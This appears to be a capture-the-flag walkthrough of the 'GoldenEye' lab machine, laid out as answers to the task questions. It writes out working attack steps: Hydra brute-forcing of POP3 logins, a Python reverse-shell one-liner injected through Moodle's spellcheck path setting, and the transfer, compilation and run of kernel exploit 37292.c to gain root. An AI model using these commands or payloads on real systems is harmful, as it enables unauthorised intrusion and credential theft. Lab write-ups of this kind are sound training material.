Task1:
------

We can disable reverse DNS lookups to speed up the scan:

nmap <ip> --open -Pn -n -p-
                      
		      ^ 
                      |---- disable rev-DNS lookup


I went to the website at http port. It was told on that webpage to go to /sev-home/ directory. I went there, I was prompted with a login page. So, we need a user and a password.

Q. Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

---> I took a look at the opening page source code but couldn't find anything...

But it was told to me to check, I started clicking on every link of the webpage(source-code), terminal.js has got the encoded password of 1 line...


Q. Who needs to make sure they update their default password?

----> Usernames are written on that website (2 usernames)

1st starts with ----> B
2nd starts with ----> N

Q. Whats their password?

---->  But it was told to me to check, I started clicking on every link of the webpage(source-code), terminal.js has got the encoded password of 1 line...

I then decrypted it with ---> HTML to text converter online or it can be done with 
Burpsuit decoder as well.



Task2:
------

I logged in to that website /sev-home/ ---> I saw that pop3 was running, written in taht page.

Q. If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?

----> We will use hydra to obtain password on service pop3

But 1st we have to see in which port it is running...

Suspecting port 55006 and 55007, beacause these are the ports, till now we haven't checked the services running on them yet...

nmap -Pn -p 55006,55007 -sV <ip> 

---> 
PORT      STATE SERVICE     VERSION
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d 

So, only port 55007...awesome

As We got two username : we will perform brute-force twice:

1. hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 10.10.168.149 -s 55007 -I pop3 


✓ ✓  Rockyou.txt was taking too much time ✓ ✓


[55007][pop3] host: 10.10.168.149   login: boris   password: secret1!

2. hydra -l natalya -P /usr/share/wordlists/rockyou.txt -t20 10.10.168.149 -s 55007 -I pop3

[55007][pop3] host: 10.10.168.149   login: natalya   password: bird

Q. Inspect port 55007, what services is configured to use this port?

----> telnet

Q. What can you find on this service?

--> I logged in with:

1. 

> telnet 10.10.168.149 55007

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

---> There we go: We got username and password...


Task 3:
-------

Logged in to the website with the new xenia:RCP90rulez! creds.

It said --> You can not enroll yourself in this course.

I also got a message from doak:

Let's use this username and use hydra to bruteforce.

But wait, What will we brute force...??

If you see, in the message carefully:

> If you have any questions message me via email

We will bruteforce pop3...

> hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.168.149:55007

OR

> hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t20 10.10.168.149 -s 55007 -I pop3

--> [55007][pop3] host: 10.10.168.149   login: doak   password: goat

We used: telnet with this creds,

We again got creds with which we will again use telnet but now with this user:pass

We got again:

username: dr_doak
password: 4England!

With this we will login to moodle (severnaya-station.com)

I went to search for files as soon as I logged in...

I went to My profilt > My private files ---> *.txt and downloaded it.

Within this txt file, We got a message:

> Something juicy is located here: /dir007key/for-007.jpg

$ wget http://severnaya-station.com/dir007key/for-007.jpg

Opened the file ----> Acc. to me this should be related to the administrative 

To analyze the metadata of the image:

$ exiftool for-007.jpg

WE got a thing:

> Image Description     : eFdpbnRlcjE5OTV4IQ==

Then:
2 Equal sign at the end => most probably base64

$ echo eFdpbnRlcjE5OTV4IQ== | base64

-> Got a pass

According to me, this is admin passwd as the image is revealing...

YUPP!!!!! I was right ✓

Now we have to get a shell:

1st lets start a listener:

$ rlwrap nc -nlvp 4444

Now lets start a connector in the trgt:

Search for 'spell' in the search box:

And got the search eangine: ----> changed to PSpellShell

And add: python rev shell:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

Then we would go to Navigation > My profile > Blog > Add a new entry

WE will fill up "Entry title" as well as entry body...

Then add them just...

Then we will get a shell

Q. Kernel Version:

---> uname -r

Q. For exploitation part:

Now download the 37292.c exploit

And then transfer the exploit file from attacker to trgt machine simply by running: python3 -m http.server 8080 on the attacker machine

trgt machine> wget <ip/exploit.c>   ----> To download

Then compile it> gcc exploit.c -o exploit

We will see a error as gcc compiler is not present there in the trgt

$ which gcc

The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'


We will run cc compiler (Basically, Sun C++ compiler)

$ which cc
/usr/bin/cc

So this is present, we can use it.

But before that we have to make configuration change as the downloaded exploit is meant to be compiled with gcc.

$ sed -i "s/gcc/cc/g" 37292.c

$ cc 37292.c -o exploit

$  ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami

root

BOOM!!, We got the priv. shell

Q. What is the root flag?

---> 
$ cd /root 
$ ls -a
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history

-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo

$ cat .flag.txt


There we go!!

This machine is actually OSCP based box...
